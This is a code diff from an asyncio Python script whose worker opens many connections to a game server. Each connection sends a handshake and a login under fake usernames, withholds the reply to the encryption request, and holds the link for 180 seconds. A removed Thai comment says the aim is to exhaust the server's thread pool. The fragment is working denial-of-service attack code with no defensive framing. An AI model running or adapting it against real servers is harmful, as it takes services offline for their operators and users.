@@ -42,12 +42,10 @@ async def worker(host, port, stop, count, holding):
             )
             username = f"{names[i % len(names)]}{i}"
 
-            # ส่ง handshake + login start
             writer.write(handshake_packet(host, port))
             writer.write(login_packet(username))
             await writer.drain()
 
-            # รอ encryption request จาก server แล้วไม่ตอบ
             try:
                 await asyncio.wait_for(reader.read(1024), timeout=0.1)
             except:
@@ -56,7 +54,6 @@ async def worker(host, port, stop, count, holding):
             count[0] += 1
             holding[0] += 1
 
-            # ค้างไว้ 180s ไม่ปิด — กิน thread pool server
             await asyncio.sleep(180)
 
             holding[0] -= 1
